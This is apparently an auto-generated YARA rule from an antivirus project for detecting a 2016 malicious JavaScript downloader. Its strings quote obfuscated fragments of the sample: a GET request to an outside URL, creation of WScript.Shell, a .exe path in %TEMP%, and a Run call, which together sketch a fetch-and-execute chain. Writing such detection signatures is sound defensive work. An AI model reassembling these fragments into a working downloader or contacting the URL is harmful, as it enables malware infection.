rule sig_20160330_74f41c8ac079893e796d3d29d1c1c0e5 {
  meta:
    description = "datamaliciousorder - file 20160330_74f41c8ac079893e796d3d29d1c1c0e5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "98b215e5a94ab0ecdba40e4d84e1a35d097ef735f0fcb343871eced38bcca17d"

  strings:
    $s1  = "_J0[_EL](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "function _FB(_D0, _CO){_TX = _TX * 1; return _D0 - _CO;};" fullword ascii
    $s3  = "var _NC = function _NG() {return WScript[_X](\"WScript\"+\".Shell\");}(), _FW = 11;" fullword ascii
    $s4  = "if (_J0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _J() {return _NC[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"UnY5Ao01Js.ex\" + \"e\";};" fullword ascii
    $s6  = "function _BJ(){return _F + \"\";};" fullword ascii
    $s7  = "function _OQ() {return ((_D == true) && (_D == _XK)) ? 1 : _TX;};" fullword ascii
    $s8  = "function _HX(_S){_NC[\"Run\"](_S, _TX, _TX);};" fullword ascii
    $s9  = "function _N(){return 22;};" fullword ascii
    $s10 = "return _FB(_CU, _C);" fullword ascii
    $s11 = "function _SO(_IQ) {var _WB = (1, 2, 3, 4, 5, _IQ); return _WB;};" fullword ascii
    $s12 = "function _RQ()" fullword ascii
    $s13 = "function _Q(){return _X;};" fullword ascii
    $s14 = " while (_L){" fullword ascii
    $s15 = "var _CR = new this[\"Date\"]();" fullword ascii
    $s16 = "var _D = false;" fullword ascii
    $s17 = "var _BM = false;" fullword ascii
    $s18 = "_D = true; " fullword ascii
    $s19 = "var _XK = false;" fullword ascii
    $s20 = "_XK = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}